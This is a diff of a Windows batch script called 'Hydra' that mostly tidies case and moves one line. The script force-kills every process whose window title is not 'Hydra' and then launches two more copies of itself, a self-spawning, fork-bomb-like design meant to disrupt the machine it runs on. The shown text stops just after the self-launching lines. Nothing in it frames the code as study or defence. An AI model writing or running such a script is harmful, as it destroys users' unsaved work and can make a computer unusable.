@@ -1,18 +1,18 @@
 @ECHO OFF
 TITLE Hydra 
 SET n=0
+IF NOT EXIST data.txt TYPE nul > data.txt
 :begin
 SET /a n+=1
-IF NOT EXIST data.txt type nul > data.txt
 FINDSTR /m "%n%" data.txt
-if %errorlevel%==0 (
-goto :begin
+IF %errorlevel%==0 (
+GOTO :begin
 )
 :loop 
-FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq Hydra" ^| find/c "exe"`) DO (
+FOR /F "tokens=* USEBACKQ" %%F IN (`TASKLIST /FI "WINDOWTITLE eq Hydra" ^| FIND/C "exe"`) DO (
 SET windowcount=%%F
 )
-taskkill /F /FI "WINDOWTITLE ne Hydra"
+TASKKILL /F /FI "WINDOWTITLE ne Hydra"
 IF "%windowcount%"=="%n%" (
 START Hydra.bat
 START Hydra.bat
